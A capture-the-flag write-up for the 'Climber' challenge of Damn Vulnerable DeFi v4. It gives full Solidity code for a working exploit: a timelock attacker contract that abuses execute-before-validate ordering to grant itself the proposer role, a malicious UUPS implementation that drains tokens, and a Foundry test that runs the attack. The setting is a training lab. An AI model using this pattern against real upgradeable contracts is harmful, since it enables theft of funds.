# 12. Climber

- This challenge featured the UUPS proxy pattern.
- The admin of the proxy was compromised and we were able to get control of it and execute transactions at will.
- We were able to execute a transaction where we execute the `upgradeToAndCall` function on the proxy and change the implementation to our attacking contract. This completely bypasses all of the previous defence mechanisms of the first implementation.
- We were able to drain the contract of it’s tokens.

## Solution

- `ClimberTimelockAttacker.sol` - this contract served as a middleman that was given proposer roles in order to execute the transactions against the `ClimberTimelock` contract

```
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {ClimberTimelock} from "../ClimberTimelock.sol";
import {ClimberVaultAttackImplementation} from "./ClimberVaultAttackImplementation.sol";

contract ClimberTimelockAttacker {
    function attackOperationSchedule(
        address payable timelock,
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements
    ) public {
        bytes[] memory newDataElements = new bytes[](3);

        newDataElements[0] = dataElements[0];
        newDataElements[1] = dataElements[1];
        newDataElements[2] = abi.encodeWithSignature(
            "attackOperationSchedule(address,address[],uint256[],bytes[])", timelock, targets, values, dataElements
        );

        ClimberTimelock(timelock).schedule(targets, values, newDataElements, bytes32("grant proposer role"));
    }

    function attackClimberVault(
        address payable timelockAdminContract,
        address attackImplementation,
        address climberVault,
        address recovery,
        address token
    ) public {
        address[] memory targets = new address[](1);
        targets[0] = climberVault;
        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        bytes[] memory dataElements = new bytes[](1);
        dataElements[0] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            attackImplementation,
            abi.encodeWithSignature("sweepDvtTokens(address,address)", recovery, token)
        );

        ClimberTimelock(timelockAdminContract).schedule(targets, values, dataElements, bytes32("sweep tokens"));
        ClimberTimelock(timelockAdminContract).execute(targets, values, dataElements, bytes32("sweep tokens"));
    }
}

```

- `ClimberVaultAttackImplementation.sol` - this was the new attack implementation contract to which we upgraded the proxy to. It has a simple functionality to drain the contract

```
// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {DamnValuableToken} from "../../DamnValuableToken.sol";

contract ClimberVaultAttackImplementation is UUPSUpgradeable {
    constructor() {}

    function sweepDvtTokens(address recovery, address token) public {
        DamnValuableToken(token).transfer(recovery, DamnValuableToken(token).balanceOf(address(this)));
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}

```

- `Climber.t.sol` - the test file where we deploy the attacking contracts and execute the attack!

```solidity
function test_climber() public checkSolvedByPlayer {
        console2.log("Vault DVT tokens balance before attack", token.balanceOf(address(vault)));

        ClimberTimelockAttacker attacker = new ClimberTimelockAttacker();
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);

        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(attacker);
        values[0] = 0 wei;
        values[1] = 0 wei;
        values[2] = 0 wei;
        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, uint64(0));
        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(attacker));
        dataElements[2] = abi.encodeWithSignature(
            "attackOperationSchedule(address,address[],uint256[],bytes[])",
            address(timelock),
            targets,
            values,
            dataElements
        );
        timelock.execute(targets, values, dataElements, bytes32("grant proposer role"));

        ClimberVaultAttackImplementation attackImplementation = new ClimberVaultAttackImplementation();

        attacker.attackClimberVault(
            payable(address(timelock)), address(attackImplementation), address(vault), address(recovery), address(token)
        );

        console2.log("Vault DVT tokens balance before attack", token.balanceOf(address(vault)));
}

```
